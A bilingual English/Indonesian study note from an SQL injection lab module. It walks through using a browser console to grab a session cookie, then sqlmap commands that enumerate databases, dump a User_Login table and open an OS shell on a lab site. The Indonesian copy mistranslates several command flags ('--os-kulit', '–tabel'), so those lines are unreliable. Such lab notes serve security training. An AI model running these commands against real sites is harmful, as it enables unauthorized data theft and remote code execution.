# Bagian 01: SQL Injection Concepts/Konsep Injeksi SQL


**Modul 15: SQL Injection/Injeksi SQL**

**Lab1-Task2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap/Melakukan Serangan Injeksi SQL Terhadap MSSQL untuk Mengekstrak Database menggunakan sqlmap**


- Login a website
- Inspect element
- Dev tools-\&gt;Console: document.cookie
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; –dbs**
  - **-u: Specify the target URL**
  - **--cookie: Specify the HTTP cookie header value**
  - **--dbs: Enumerate DBMS databases**
- Get a list of databases
- Select a database to extract its tables
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –tables**
  - **-D: Specify the DBMS database to enumerate**
  - **--tables: Enumerate DBMS database tables**
- Get a list of tables
- Select a column
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; -D moviescope –T User\_Login --dump**
- Get table data of this column
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;value&quot; --os-shell**
- Get the OS Shell
- TASKLIST

------------------------------------------------------------------------------ mungkin saya harus menulisnya dalam bahasa indonesia agar mudah di mengerti:

- Masuk ke situs web
- Memeriksa elemen
- Alat pengembang-\&gt;Konsol: document.cookie
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;nilai&quot; –dbs**
 - **-u: Tentukan URL target**
 - **--cookie: Tentukan nilai header cookie HTTP**
 - **--dbs: Menghitung database DBMS**
- Dapatkan daftar database
- Pilih database untuk mengekstrak tabelnya
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;nilai&quot; -D moviescope –tabel**
 - **-D: Tentukan database DBMS yang akan dihitung**
 - **--tabel: Menghitung tabel database DBMS**
- Dapatkan daftar tabel
- Pilih kolom
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;nilai&quot; -D moviescope –T Pengguna\_Login --dump**
- Dapatkan data tabel kolom ini
- **sqlmap -u &quot;http://www.moviescope.com/viewprofile.aspx?id=1&quot; --cookie=&quot;nilai&quot; --os-kulit**
- Dapatkan OS Shell
- DAFTAR TUGAS

--------------------------------------------------- ----------------------------

## Konsep

Structured query language (SQL)/Bahasa kueri terstruktur (SQL)

[Definisi](../definitions/definitions_S.md#struktur-kueri-bahasa)

Structured query language (SQL) injection
/Injeksi bahasa kueri terstruktur (SQL).

[Definisi](../definitions/definitions_S.md#struktur-query-bahasa-injeksi)

Remote code execution (RCE)/Eksekusi kode jarak jauh (RCE)

[Definisi](../definitions/definitions_R.md#remote-code-execution)
